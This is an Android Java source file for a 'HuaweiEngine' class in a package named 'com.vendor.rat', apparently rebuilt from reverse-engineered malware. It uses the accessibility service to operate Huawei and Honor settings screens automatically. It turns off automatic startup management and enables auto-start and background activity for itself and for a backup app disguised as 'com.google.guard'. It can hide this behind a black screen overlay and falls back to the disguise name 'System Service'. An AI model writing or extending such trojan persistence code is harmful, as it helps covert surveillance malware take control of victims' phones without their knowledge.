package com.vendor.rat.auto.engine.vendor;

import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.filter.NodeFilter;
import com.vendor.rat.helper.StealthIntent;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 华为/荣耀厂商适配引擎
 *
 * 基于逆向分析: o/n.java (454 行) — 完整对齐
 *
 * 核心特性:
 *   - 荣耀适配: com.hihonor.systemmanager
 *   - 4种窗口检测: j0(华为设置)/i0(应用和服务)/k0(启动管理)/h0(对话框)
 *   - ConcurrentLinkedQueue 状态机
 *   - r0() 完整启动管理操作流程
 *   - 配置驱动文本匹配
 *
 * 监听的界面:
 *   - com.huawei.systemmanager / StartupAppControlActivity
 *   - com.hihonor.systemmanager / StartupAppControlActivity (荣耀)
 *   - com.android.settings / HWSettings
 *   - com.android.settings / SubSettings
 *   - AlertDialog (对话框)
 *
 * 市场份额: ~25%
 */
public class HuaweiEngine extends AutoEngine {

    private static final String TAG = "HuaweiEngine";

    // ====== 包名 ======
    private static final String HUAWEI_SM = "com.huawei.systemmanager";
    private static final String HONOR_SM = "com.hihonor.systemmanager";
    private static final String SETTINGS = "com.android.settings";

    // ====== Activity ======
    private static final String STARTUP_APP_CONTROL =
        "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity";
    private static final String STARTUP_NORMAL_LIST =
        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity";
    private static final String HONOR_STARTUP_APP_CONTROL =
        "com.hihonor.systemmanager.appcontrol.activity.StartupAppControlActivity";
    private static final String HW_SETTINGS = "com.android.settings.HWSettings";
    private static final String SUB_SETTINGS = "com.android.settings.SubSettings";
    private static final String CLEAN_SUB_SETTINGS = "com.android.settings.CleanSubSettings";
    private static final String APP_AND_NOTIFICATION =
        "com.android.settings.Settings$AppAndNotificationDashboardActivity";
    private static final String INSTALLED_APP_DETAILS =
        "com.android.settings.applications.InstalledAppDetailsTop";
    private static final String ALERT_DIALOG = "android.app.AlertDialog";

    // ====== 状态常量 — 对应逆向 ConcurrentLinkedQueue ======
    private static final String ST_HW_SETTINGS = "keepAliveInHwSettings";
    private static final String ST_APP_NOTIF = "keepAliveInAppAndNotification";
    private static final String ST_STARTUP = "keepAlvieInStartupAppControl";
    private static final String ST_DIALOG = "keepAliveInAlertDialog";

    // ====== 状态字段 — 对齐 vendor o/n.java 字段 ======
    // 主应用
    private final AtomicBoolean mainAutoStart = new AtomicBoolean(false);
    private final AtomicBoolean mainRelateStart = new AtomicBoolean(true);
    private final AtomicBoolean mainBackground = new AtomicBoolean(false);
    // 备份应用 (vendor: f676t, f678v, f680x)
    private final AtomicBoolean backupAutoStart = new AtomicBoolean(false);
    private final AtomicBoolean backupRelateStart = new AtomicBoolean(true);
    private final AtomicBoolean backupBackground = new AtomicBoolean(false);

    // vendor: f674r — 当前保活目标
    private enum KeepAliveTarget { UNKNOWN, MAIN_APP, BACKUP_APP }
    private final AtomicReference<KeepAliveTarget> keepAliveTarget =
            new AtomicReference<>(KeepAliveTarget.UNKNOWN);

    private String appName;

    // 窗口检测分组
    private final List<WindowMatcher> startupWindows = new ArrayList<>();
    private final List<WindowMatcher> hwSettingsWins = new ArrayList<>();
    private final List<WindowMatcher> appNotifWins = new ArrayList<>();
    private final List<WindowMatcher> dialogWins = new ArrayList<>();

    public HuaweiEngine() {
        super(buildAllMatchers(), SETTINGS);
        buildDetectionGroups();

        // 定时任务: 50秒 — 对应逆向 schedule(new m(this, 4), 50L, SECONDS)
        try {
            scheduler.schedule(new Runnable() {
                @Override
                public void run() { checkCompletion(); }
            }, 50L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "Schedule failed", e);
        }
    }

    // ============ 窗口匹配 — 对应逆向 s0() ============

    private static List<WindowMatcher> buildAllMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // 华为设置
        list.add(new WindowMatcher(SETTINGS, HW_SETTINGS)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SETTINGS, SUB_SETTINGS));
        list.add(new WindowMatcher(SETTINGS, CLEAN_SUB_SETTINGS));
        list.add(new WindowMatcher(SETTINGS, APP_AND_NOTIFICATION));
        list.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS));

        // 华为启动管理
        list.add(new WindowMatcher(HUAWEI_SM, STARTUP_APP_CONTROL)
            .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(HUAWEI_SM, STARTUP_NORMAL_LIST));

        // 荣耀启动管理
        list.add(new WindowMatcher(HONOR_SM, HONOR_STARTUP_APP_CONTROL)
            .addEventType(32).addEventType(16384));

        // 对话框
        list.add(new WindowMatcher(HUAWEI_SM, ALERT_DIALOG));
        list.add(new WindowMatcher(HONOR_SM, ALERT_DIALOG));

        return list;
    }

    private void buildDetectionGroups() {
        startupWindows.add(new WindowMatcher(HUAWEI_SM, STARTUP_APP_CONTROL));
        startupWindows.add(new WindowMatcher(HUAWEI_SM, STARTUP_NORMAL_LIST));
        startupWindows.add(new WindowMatcher(HONOR_SM, HONOR_STARTUP_APP_CONTROL));

        hwSettingsWins.add(new WindowMatcher(SETTINGS, HW_SETTINGS));
        hwSettingsWins.add(new WindowMatcher(SETTINGS, CLEAN_SUB_SETTINGS));

        appNotifWins.add(new WindowMatcher(SETTINGS, SUB_SETTINGS));
        appNotifWins.add(new WindowMatcher(SETTINGS, APP_AND_NOTIFICATION));
        appNotifWins.add(new WindowMatcher(SETTINGS, INSTALLED_APP_DETAILS));

        dialogWins.add(new WindowMatcher(HUAWEI_SM, ALERT_DIALOG));
        dialogWins.add(new WindowMatcher(HONOR_SM, ALERT_DIALOG));
    }

    // ============ 事件处理 — 对齐逆向 u() ============

    /**
     * 对应逆向: n.u(AccessibilityEvent, String, String)
     * 注意: vendor 使用独立 if (非 else-if), 所有状态都检查
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event, String packageName,
                                     String className) {
        try {
            if (isCompleted()) return;

            currentPackage = packageName;
            currentClassName = className;

            // 对应逆向: super.u(event, str, str2)
            if (event != null) {
                // base class event processing
            }

            boolean inHwSettings = j0();

            if (inHwSettings) {
                stateQueue.remove(ST_APP_NOTIF);
                stateQueue.remove(ST_STARTUP);
                stateQueue.remove(ST_DIALOG);
                if (!stateQueue.contains(ST_HW_SETTINGS)) {
                    stateQueue.add(ST_HW_SETTINGS);
                    // case 0: handleHwSettings — 搜索直达，优先级最高
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() { handleHwSettings(); }
                    });
                }
                // 搜索方式已提交，跳过 i0() 导航避免并发冲突
                return;
            }
            if (i0()) {
                stateQueue.remove(ST_HW_SETTINGS);
                stateQueue.remove(ST_STARTUP);
                stateQueue.remove(ST_DIALOG);
                if (!stateQueue.contains(ST_APP_NOTIF)) {
                    stateQueue.add(ST_APP_NOTIF);
                    // case 1: handleAppAndNotification
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() { handleAppAndNotification(); }
                    });
                }
            }
            if (k0()) {
                stateQueue.remove(ST_HW_SETTINGS);
                stateQueue.remove(ST_APP_NOTIF);
                stateQueue.remove(ST_DIALOG);
                if (!stateQueue.contains(ST_STARTUP)) {
                    stateQueue.add(ST_STARTUP);
                    // case 2: handleStartupControl
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() { handleStartupControl(); }
                    });
                }
            }
            if (h0()) {
                stateQueue.remove(ST_HW_SETTINGS);
                stateQueue.remove(ST_APP_NOTIF);
                stateQueue.remove(ST_STARTUP);
                if (!stateQueue.contains(ST_DIALOG)) {
                    stateQueue.add(ST_DIALOG);
                    // case 3: handleAlertDialog
                    scheduler.execute(new Runnable() {
                        @Override
                        public void run() { handleAlertDialog(); }
                    });
                }
            }
        } catch (Exception e) {
            logError("事件处理异常", e);
        }
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        // 由 onAccessibilityEvent 处理
    }

    /**
     * vendor: HuaweiEngine 是纯事件驱动的，不主动启动
     * execute() 不应该调用 openStartupManagement()
     * 设置页面由 StrategyThread.applyBlockView() 打开
     * HuaweiEngine 被动检测窗口变化
     */
    @Override
    public void execute() {
        // vendor: 纯事件驱动，不主动执行
        log("HuaweiEngine is event-driven, waiting for window events");
    }

    // ============ 窗口检测 — 对应逆向 j0/i0/k0/h0 ============

    private boolean k0() { return matchesAny(startupWindows); }
    private boolean j0() { return matchesAny(hwSettingsWins); }
    private boolean i0() { return matchesAny(appNotifWins); }
    private boolean h0() { return matchesAny(dialogWins); }

    // ============ 打开启动管理 ============

    private void openStartupManagement() {
        try {
            showBlackScreen(true);
            updateProgress(10);
            startSilent(HUAWEI_SM, STARTUP_NORMAL_LIST);
            log("Opened Huawei startup management");
        } catch (Exception e) {
            logError("Huawei path failed", e);
            try {
                startSilent(HONOR_SM, HONOR_STARTUP_APP_CONTROL);
                log("Opened Honor startup management");
            } catch (Exception e2) {
                logError("Honor path also failed", e2);
                removeBlackScreen();
            }
        }
    }

    // ============ 启动管理操作 — 对齐逆向 r0() ============

    /**
     * 处理启动管理窗口
     * 对应逆向: r0() (第 247-358 行)
     *
     * 华为启动管理 UI 结构 (从 uiautomator dump 确认):
     *   每行: [ImageView 图标] [LinearLayout: [TextView 应用名] [TextView "自动管理"/"手动管理"]] [Switch]
     *   Switch checked=true → 自动管理 (需要关闭)
     *   Switch checked=false → 手动管理 (已经是我们要的)
     *   关闭 Switch → 弹出 AlertDialog → 点击确认
     *
     * 流程:
     *   1. 确定操作目标 (主进程/备用进程)
     *   2. 激活根节点 → 获取滚动视图
     *   3. 滚动查找应用
     *   4. 查找同行 Switch
     *   5. Switch checked → 点击关闭 → 等待对话框
     *   6. Switch unchecked → 已手动管理 → 处理下一个进程
     */
    private void handleStartupControl() {
        try {
            updateProgress(50);

            // vendor o/n.java:254-258: 首次进入设置目标为 MAIN_APP
            if (keepAliveTarget.get() == KeepAliveTarget.UNKNOWN) {
                keepAliveTarget.set(KeepAliveTarget.MAIN_APP);
            }

            String target = getAppName();
            if (keepAliveTarget.get() == KeepAliveTarget.BACKUP_APP) {
                target = getBackupAppName();
            }

            // 使用搜索查找应用 (不依赖滚动视图)
            UiNode appNode = searchAppInStartupControl(target);

            if (appNode == null) {
                logError(keepAliveTarget.get() + " App查找失败: " + target);
                saveState();
                handleAppSwitchOrFinish();
                return;
            }

            log(keepAliveTarget.get() + " App查找成功: " + target);
            updateProgress(55);

            // 华为启动管理: 查找同行的 Switch
            UiNode parent = appNode.getParent();
            if (parent != null) parent = parent.getParent();
            UiNode switchNode = null;

            if (parent != null) {
                switchNode = parent.findOneByCombine(CombineFilter.switchWidget());
                if (switchNode == null) {
                    switchNode = parent.findOneByClassName("android.widget.Switch");
                }
            }

            if (switchNode == null) {
                UiNode clickableParent = appNode.findClickableParent();
                if (clickableParent != null) {
                    switchNode = clickableParent.findOneByCombine(
                        CombineFilter.or(CombineFilter.checkBox(), CombineFilter.switchWidget()));
                }
            }

            if (switchNode != null) {
                updateProgress(60);
                log("Switch 查找成功, checked=" + switchNode.isChecked());

                if (switchNode.isChecked()) {
                    log("自动管理已开启，点击关闭");
                    switchNode.click();
                    updateProgress(65);
                    T0(5);
                    return;
                } else {
                    // vendor o/n.java:296-301 / 337-343: 标记当前目标完成
                    if (keepAliveTarget.get() == KeepAliveTarget.MAIN_APP
                            || keepAliveTarget.get() == KeepAliveTarget.UNKNOWN) {
                        mainAutoStart.set(true);
                        mainRelateStart.set(true);
                        mainBackground.set(true);
                        log("主进程已选择手动管理");
                    } else {
                        backupAutoStart.set(true);
                        backupRelateStart.set(true);
                        backupBackground.set(true);
                        log("备用进程已选择手动管理");
                    }
                    updateProgress(80);
                    // vendor o/n.java:300-301 / 341-343: 切换到下一个目标或结束
                    handleAppSwitchOrFinish();
                }
            } else {
                logError("Switch 未找到");
                UiNode clickable = appNode.findClickableParent();
                if (clickable == null) clickable = appNode.getParent();
                if (clickable != null) {
                    clickable.click();
                    log("点击进入应用详情");
                    T0(5);
                    handleAppDetail();
                } else {
                    saveState();
                    finishAsync();
                }
            }
        } catch (Exception e) {
            logError("启动管理操作异常", e);
        }
    }

    /**
     * 通过搜索框查找应用 — 不滚动列表
     */
    private UiNode searchAppInStartupControl(String appName) {
        try {
            G();
            UiNode root = k();
            if (root == null) return null;

            // 1. 查找搜索框
            UiNode searchBox = root.findOneByClassName("android.widget.AutoCompleteTextView");
            if (searchBox == null) {
                searchBox = root.findOneById("com.huawei.systemmanager:id/et_search");
            }
            if (searchBox == null) {
                UiNode searchView = root.findOneByClassName("android.widget.SearchView");
                if (searchView != null) {
                    searchBox = searchView.findOneByClassName("android.widget.AutoCompleteTextView");
                    if (searchBox == null) {
                        searchBox = searchView.findOneByClassName("android.widget.EditText");
                    }
                }
            }

            if (searchBox != null) {
                // 2. 点击搜索框激活
                searchBox.click();
                T0(3);

                // 3. 输入应用名
                android.os.Bundle args = new android.os.Bundle();
                args.putCharSequence(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    appName);
                searchBox.performAction(
                    android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                log("搜索框输入: " + appName);
                T0(5); // 等待搜索结果

                // 4. 刷新根节点，查找搜索结果
                G();
                root = k();
                if (root != null) {
                    UiNode result = root.findOneByTextContains(appName);
                    if (result != null) {
                        log("搜索结果找到: " + appName);
                        return result;
                    }
                }
            } else {
                log("搜索框未找到，使用直接查找");
            }

            // fallback: 直接在当前页面查找
            G();
            root = k();
            if (root != null) {
                return root.findOneByTextContains(appName);
            }
        } catch (Exception e) {
            logError("searchAppInStartupControl error", e);
        }
        return null;
    }

    // ============ 应用详情 — 3 个开关 ============

    private void handleAppDetail() {
        UiNode root = getRootNode();
        if (root == null) return;

        // 开关 1: 允许自启动
        toggleSwitch(root, "HUA_WEI_ALLOW_AUTO_STARTUP_TEXT", mainAutoStart);
        T0(3);

        // 开关 2: 允许关联启动
        root = getRootNode();
        if (root != null) {
            toggleSwitch(root, "HUA_WEI_ALLOW_RELATE_STARTUP_TEXT", mainRelateStart);
        }
        T0(3);

        // 开关 3: 允许后台活动
        root = getRootNode();
        if (root != null) {
            toggleSwitch(root, "HUA_WEI_ALLOW_IN_BACKGROUND_TEXT", mainBackground);
        }

        updateProgress(80);
        log("主进程 3个开关处理完成");

        T0(3);
        performBack();

        saveState();
        finishAsync();
    }    private void toggleSwitch(UiNode root, String configKey, AtomicBoolean flag) {
        CombineFilter filter = buildTextViewFilter(configKey);
        if (filter == null) return;

        UiNode label = root.findOneByCombine(filter);
        if (label == null) {
            logError("开关标签未找到: " + configKey);
            return;
        }

        UiNode parent = label.findClickableParent();
        if (parent == null) parent = label.getParent();
        if (parent == null) return;

        UiNode sw = parent.findOneByClassName("android.widget.Switch");
        if (sw == null) sw = parent.findOneByCombine(CombineFilter.switchWidget());

        if (sw != null) {
            if (!sw.isChecked()) {
                sw.click();
                log("已开启: " + configKey);
            } else {
                log("已经开启: " + configKey);
            }
            flag.set(true);
        } else {
            logError("Switch 未找到: " + configKey);
        }
    }

    // ============ 对话框 ============

    private void handleAlertDialog() {
        T0(3);
        UiNode root = getRootNode();
        if (root == null) return;

        // 华为"手动管理"对话框 UI 结构 (uiautomator dump 确认):
        //   RelativeLayout > [LinearLayout > [TextView "允许自启动"], Switch]
        // 需要先开启三个开关，再点击确定
        toggleSwitchInDialog(root, "HUA_WEI_ALLOW_AUTO_STARTUP_TEXT", mainAutoStart);
        T0(1);
        root = getRootNode();
        if (root != null) {
            toggleSwitchInDialog(root, "HUA_WEI_ALLOW_RELATE_STARTUP_TEXT", mainRelateStart);
        }
        T0(1);
        root = getRootNode();
        if (root != null) {
            toggleSwitchInDialog(root, "HUA_WEI_ALLOW_IN_BACKGROUND_TEXT", mainBackground);
        }
        T0(1);

        // 点击确定
        root = getRootNode();
        if (root == null) return;

        List<String> texts = getConfigTexts("COMMON_CONFIRM_TEXT");
        if (texts != null) {
            for (String text : texts) {
                UiNode btn = root.findOneByCombine(CombineFilter.button(text));
                if (btn != null) {
                    btn.click();
                    log("点击对话框确定: " + text);
                    updateProgress(70);
                    T0(5);
                    return;
                }
            }
        }

        texts = getConfigTexts("COMMON_ALLOW_TEXT");
        if (texts != null) {
            for (String text : texts) {
                UiNode btn = root.findOneByCombine(CombineFilter.button(text));
                if (btn != null) {
                    btn.click();
                    log("点击允许: " + text);
                    return;
                }
            }
        }
        logError("对话框按钮未找到");
    }

    /**
     * 在对话框中查找标签对应的 Switch 并开启
     * UI 结构: RelativeLayout > [LinearLayout > [TextView label], Switch]
     * label.getParent() = LinearLayout, 需要再上一层到 RelativeLayout 才能找到 Switch
     */
    private void toggleSwitchInDialog(UiNode root, String configKey, AtomicBoolean flag) {
        CombineFilter filter = buildTextViewFilter(configKey);
        if (filter == null) return;

        UiNode label = root.findOneByCombine(filter);
        if (label == null) {
            List<String> texts = getConfigTexts(configKey);
            if (texts != null) {
                for (String text : texts) {
                    label = root.findOneByTextContains(text);
                    if (label != null) break;
                }
            }
        }
        if (label == null) {
            logError("对话框中标签未找到: " + configKey);
            return;
        }

        // 上两层: TextView → LinearLayout → RelativeLayout
        UiNode parent = label.getParent();
        if (parent != null) parent = parent.getParent();
        if (parent == null) {
            logError("对话框中父节点未找到: " + configKey);
            return;
        }

        UiNode sw = parent.findOneByClassName("android.widget.Switch");
        if (sw == null) sw = parent.findOneByCombine(CombineFilter.switchWidget());

        if (sw != null) {
            if (!sw.isChecked()) {
                sw.click();
                log("对话框中已开启: " + configKey);
            } else {
                log("对话框中已经开启: " + configKey);
            }
            flag.set(true);
        } else {
            logError("对话框中 Switch 未找到: " + configKey);
        }
    }

    // ============ 华为设置 / 应用和服务 ============

    /**
     * case 0: handleHwSettings — 在华为设置页面通过搜索直达"应用启动管理"
     *
     * 优化策略: 直接在设置搜索框输入"应用启动管理"，点击搜索结果
     * 跳过原来 设置→应用和服务/应用→启动管理 的多步导航
     * 避免不同 EMUI 版本文本差异 (应用和通知/应用和服务/应用) 导致失败
     */
    private void handleHwSettings() {
        searchAndEnterStartupManagement(ST_HW_SETTINGS);
    }

    /**
     * 在设置搜索框中输入关键词并点击第一个搜索结果
     *
     * 注意: 华为设置搜索页有两种 TextView:
     *   - 搜索历史: id=com.android.settings:id/flow_textview (点击只填入搜索框)
     *   - 搜索结果: id=com.android.settings:id/title (点击进入对应页面)
     * 必须点击 title 才能跳转
     */
    private boolean searchAndClickInSettings(String keyword) {
        try {
            UiNode root = getRootNode();
            if (root == null) return false;

            // 查找搜索框
            UiNode searchBox = root.findOneByCombine(
                    StringCondition.viewId("android:id/search_src_text"));
            if (searchBox == null) {
                searchBox = root.findOneByClassName("android.widget.EditText");
            }
            if (searchBox == null) {
                searchBox = root.findOneByClassName("android.widget.AutoCompleteTextView");
            }
            if (searchBox == null) {
                log("设置搜索框未找到");
                return false;
            }

            // 点击搜索框激活
            searchBox.click();
            T0(3);

            // 输入关键词
            Bundle args = new Bundle();
            args.putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    keyword);
            searchBox.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
            log("搜索框输入: " + keyword);
            T0(10); // 等待搜索结果

            // 刷新并查找搜索结果
            G();
            root = getRootNode();
            if (root == null) return false;

            // 优先: 通过 title ID 查找搜索结果 (不是搜索历史 flow_textview)
            UiNode result = root.findOneByCombine(CombineFilter.and(
                    StringCondition.viewId("com.android.settings:id/title"),
                    StringCondition.textContains(keyword)));
            if (result != null) {
                result.click();
                log("点击搜索结果 (title): " + keyword);
                T0(5);
                return true;
            }

            // 次选: 查找 path 旁边的 title (有 path 说明是搜索结果而非历史)
            UiNode pathNode = root.findOneByCombine(
                    StringCondition.viewId("com.android.settings:id/path"));
            if (pathNode != null) {
                // path 的兄弟节点 title 就是搜索结果
                UiNode parent = pathNode.getParent();
                if (parent != null) {
                    result = parent.findOneByCombine(CombineFilter.and(
                            StringCondition.viewId("com.android.settings:id/title"),
                            StringCondition.textContains(keyword)));
                    if (result == null) {
                        // 点击整个父容器
                        parent.click();
                        log("点击搜索结果 (parent): " + keyword);
                        T0(5);
                        return true;
                    }
                    result.click();
                    log("点击搜索结果 (path sibling): " + keyword);
                    T0(5);
                    return true;
                }
            }

            log("搜索结果中未找到: " + keyword);
            performBack();
            T0(3);
            return false;
        } catch (Exception e) {
            logError("searchAndClickInSettings error", e);
            return false;
        }
    }

    /**
     * 回退导航方式: 设置 → 应用/应用和服务 → 启动管理
     * 作为搜索方式失败时的 fallback
     */
    private void navigateToStartupManagement() {
        CombineFilter filter = buildTextViewFilter("HUA_WEI_APP_AND_NOTIFICATION_TEXT");

        // 首次打开设置主页
        launchSettings(SETTINGS, HW_SETTINGS);
        T0(10);
        G();

        UiNode node = null;
        for (int retry = 0; retry < 5; retry++) {
            if (retry > 0) { T0(5); G(); }

            UiNode scrollView = Q();
            UiNode searchRoot = scrollView != null ? scrollView : k();
            if (searchRoot == null) { G(); T0(5); continue; }

            // 长文本 contains 匹配
            if (filter != null) {
                node = searchRoot.findOneByCombine(filter);
                if (node == null && scrollView != null) {
                    node = scrollView.scrollForwardUntil(filter);
                    if (node == null) {
                        // 可能在底部，向上滚动查找
                        scrollView.scrollBackward();
                        T0(3);
                        scrollView.scrollBackward();
                        T0(3);
                        scrollView.scrollBackward();
                        T0(3);
                        node = scrollView.scrollForwardUntil(filter);
                    }
                }
            }

            // 短文本精确匹配
            if (node == null) {
                List<String> shortTexts = getConfigTexts("HUA_WEI_APP_SHORT_TEXT");
                if (shortTexts != null) {
                    for (String text : shortTexts) {
                        CombineFilter exactFilter = CombineFilter.textViewExact(text);
                        node = searchRoot.findOneByCombine(exactFilter);
                        if (node != null) break;
                        if (scrollView != null) {
                            node = scrollView.scrollForwardUntil(exactFilter);
                            if (node != null) break;
                        }
                    }
                }
            }

            if (node != null) break;
            log("导航方式：应用入口未找到，重试 " + (retry + 1) + "/5");
            T0(5);
            G();
        }

        if (node != null) {
            node.click();
            log("已点击进入应用栏目（导航方式）");
        } else {
            logError("应用栏目未找到（导航方式也失败）");
        }
    }

    /**
     * 轮询确认已进入启动管理页面
     * 检查前台窗口包名是否为 systemmanager/hihonor.systemmanager
     * 最多轮询 10 次，每次 400ms，总计 4 秒
     */
    private boolean waitForStartupManagementPage() {
        for (int i = 0; i < 10; i++) {
            T0(2);
            UiNode root = getRootNode();
            if (root != null) {
                String pkg = root.getPackageName();
                if (HUAWEI_SM.equals(pkg) || HONOR_SM.equals(pkg)) {
                    log("已确认进入启动管理页面 (" + (i + 1) + "次检查)");
                    return true;
                }
            }
        }
        // fallback: 即使包名不匹配也尝试继续（可能是不同版本的包名）
        log("启动管理页面包名未匹配，当前: " + getActiveWindowPackage() + "，仍尝试继续");
        return true;
    }

    /** 获取当前前台窗口包名 (通过 UI 树，比事件回调的 currentPackage 更准确) */
    private String getActiveWindowPackage() {
        try {
            UiNode root = getRootNode();
            if (root != null) {
                return root.getPackageName();
            }
        } catch (Exception e) {
            logError("getActiveWindowPackage error", e);
        }
        return "";
    }

    /**
     * case 1: handleAppAndNotification — 从"应用和服务"子页面搜索直达启动管理
     */
    private void handleAppAndNotification() {
        searchAndEnterStartupManagement(ST_APP_NOTIF);
    }

    /**
     * 统一的搜索直达启动管理流程
     * handleHwSettings 和 handleAppAndNotification 共用
     *
     * 流程:
     *   1. 打开设置主页 (确保有搜索框)
     *   2. 搜索 "应用启动管理" → "启动管理"
     *   3. fallback: 导航方式
     *   4. 轮询确认进入启动管理页面
     *   5. 执行 handleStartupControl
     */
    private void searchAndEnterStartupManagement(String fromState) {
        try {
            T0(3);
            log(fromState + " → 搜索直达应用启动管理");

            // 打开设置主页 — 子页面没有搜索框
            launchSettings(SETTINGS, HW_SETTINGS);
            T0(10);
            G();

            boolean entered = false;

            // 搜索 "应用启动管理"
            if (searchAndClickInSettings("应用启动管理")) {
                log("搜索直达应用启动管理成功");
                entered = true;
            }

            // fallback: 搜索 "启动管理"
            if (!entered) {
                log("搜索'应用启动管理'未果，尝试'启动管理'");
                launchSettings(SETTINGS, HW_SETTINGS);
                T0(10);
                G();
                if (searchAndClickInSettings("启动管理")) {
                    log("搜索直达启动管理成功");
                    entered = true;
                }
            }

            // fallback: 导航方式
            if (!entered) {
                log("搜索方式失败，回退到导航方式");
                navigateToStartupManagement();
                entered = true;
            }

            // 轮询确认进入启动管理 + 执行操作
            if (entered) {
                if (!waitForStartupManagementPage()) {
                    logError("未能进入启动管理页面");
                    return;
                }
                stateQueue.remove(fromState);
                stateQueue.add(ST_STARTUP);
                handleStartupControl();
            }
        } catch (Exception e) {
            logError("searchAndEnterStartupManagement error (" + fromState + ")", e);
        }
    }

    // ============ 状态管理 — 对应逆向 t0() ============

    private void saveState() {
        log("保存保活策略 — 主进程: auto=" + mainAutoStart.get()
            + " relate=" + mainRelateStart.get() + " bg=" + mainBackground.get());
        if (keepAliveTarget.get() == KeepAliveTarget.BACKUP_APP) {
            log("保存保活策略 — 备用进程: auto=" + backupAutoStart.get()
                + " relate=" + backupRelateStart.get() + " bg=" + backupBackground.get());
        }
    }

    /**
     * 双应用保活切换逻辑
     * 对应 vendor o/n.java r0() 行 259-265 + 341-343
     *
     * 流程:
     *   MAIN_APP 完成 → 如果备份应用存在 → 切换到 BACKUP_APP → 重新处理
     *   BACKUP_APP 完成 → 保存状态 → Z() 结束
     *   无备份应用 → 直接结束
     */
    private void handleAppSwitchOrFinish() {
        saveState();
        if (keepAliveTarget.get() == KeepAliveTarget.MAIN_APP) {
            // vendor o/n.java:260-265: 检查备份应用
            String backupPkg = "com.google.guard";
            if (isBackupAppInstalled(backupPkg)) {
                keepAliveTarget.set(KeepAliveTarget.BACKUP_APP);
                stateQueue.clear();
                log("切换到备用进程: " + backupPkg);
                // 不调用 finishAsync，等待下一次事件触发
            } else {
                finishAsync();
            }
        } else {
            // BACKUP_APP 或 UNKNOWN 完成
            finishAsync();
        }
    }

    /**
     * 检查备份应用是否已安装
     * 对应 vendor: g.d0("com.google.guard") != null
     */
    private boolean isBackupAppInstalled(String packageName) {
        try {
            android.content.Context ctx = getContext();
            if (ctx == null) return false;
            ctx.getPackageManager().getPackageInfo(packageName, 0);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 获取备份应用名称
     * vendor: 固定为 "com.google.guard" 的应用标签
     */
    private String getBackupAppName() {
        try {
            android.content.Context ctx = getContext();
            if (ctx == null) return "com.google.guard";
            android.content.pm.PackageManager pm = ctx.getPackageManager();
            android.content.pm.ApplicationInfo ai = pm.getApplicationInfo("com.google.guard", 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return "com.google.guard";
        }
    }

    private void checkCompletion() {
        if (isCompleted()) return;
        if (mainAutoStart.get() && mainBackground.get()) {
            log("所有华为权限已授予");
            finishAsync();
        }
    }

    private String getAppName() {
        if (appName != null) return appName;
        // vendor: 从 config 或 context 获取应用标签名 (不是包名)
        try {
            android.content.Context ctx = getContext();
            if (ctx != null) {
                android.content.pm.PackageManager pm = ctx.getPackageManager();
                android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(ctx.getPackageName(), 0);
                String label = pm.getApplicationLabel(ai).toString();
                if (label != null && !label.isEmpty()) {
                    appName = label;
                    return appName;
                }
            }
        } catch (Exception e) {
            logError("getAppName error", e);
        }
        return "System Service";
    }

    public void setAppName(String name) { this.appName = name; }

    /**
     * 异步完成引擎 — 脱离 onAccessibilityEvent 的 f227l 锁
     * 使 Z() 中的遮罩移除和权限请求不阻塞事件分发
     */
    private void finishAsync() {
        new Thread(() -> finish(), "huawei-finish").start();
    }
}
